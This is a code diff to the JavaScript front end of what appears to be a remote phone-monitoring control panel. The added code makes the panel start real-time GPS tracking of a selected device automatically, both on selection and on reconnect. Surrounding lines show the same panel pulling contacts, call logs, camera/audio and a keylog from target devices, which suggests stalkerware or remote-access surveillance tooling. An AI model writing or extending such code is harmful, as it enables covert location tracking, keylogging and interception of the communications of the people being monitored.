@@ -828,6 +828,15 @@ function handleJsonMessage(data) {
             renderDeviceList();
             if (!currentDeviceId) {
                 selectDevice(data.device.deviceId);
+            } else if (data.device.deviceId === currentDeviceId) {
+                // Dispositivo atual reconectou — reativa GPS automaticamente
+                updateActiveDeviceUI(data.device);
+                realtimeLocationActive = true;
+                sendCommandTo(data.device.deviceId, 'START_LOCATION', {});
+                const btn = document.getElementById('btn-realtime-loc');
+                const btnMobile = document.getElementById('btn-realtime-loc-mobile');
+                if (btn) { btn.classList.add('active'); btn.innerHTML = '<i class="fa-solid fa-satellite-dish"></i> Desativar'; }
+                if (btnMobile) { btnMobile.classList.add('active'); btnMobile.innerHTML = '<i class="fa-solid fa-satellite-dish"></i> Desativar'; }
             }
             break;
             
@@ -1446,6 +1455,17 @@ function selectDevice(deviceId) {
         const badge = document.getElementById('cam-audio-badge');
         if (badge) badge.style.display = 'none';
         fetchDeviceHistory(deviceId);
+
+        // Auto-start location tracking when device is online so o mapa
+        // mostra a posição imediatamente sem o usuário clicar em "Ativar".
+        if (device.isOnline) {
+            realtimeLocationActive = true;
+            sendCommandTo(deviceId, 'START_LOCATION', {});
+            const btn = document.getElementById('btn-realtime-loc');
+            const btnMobile = document.getElementById('btn-realtime-loc-mobile');
+            if (btn) { btn.classList.add('active'); btn.innerHTML = '<i class="fa-solid fa-satellite-dish"></i> Desativar'; }
+            if (btnMobile) { btnMobile.classList.add('active'); btnMobile.innerHTML = '<i class="fa-solid fa-satellite-dish"></i> Desativar'; }
+        }
 
         // Auto-refresh contacts, call logs and keylog from the server DB so
         // the panels stay current without the user having to click Sync manually.
